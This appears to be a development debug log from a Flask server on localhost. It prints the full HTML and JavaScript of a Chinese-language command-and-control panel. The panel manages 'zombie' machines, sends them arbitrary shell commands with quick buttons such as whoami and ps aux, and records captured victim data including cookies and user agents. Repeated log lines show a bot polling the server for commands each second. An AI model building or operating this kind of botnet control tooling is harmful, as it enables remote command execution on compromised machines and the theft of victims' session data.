2025-06-24 23:31:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0005s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T15:31:07.492Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:31:07.500018</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:31:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:13] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:31:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:13] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:31:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:13] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:31:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
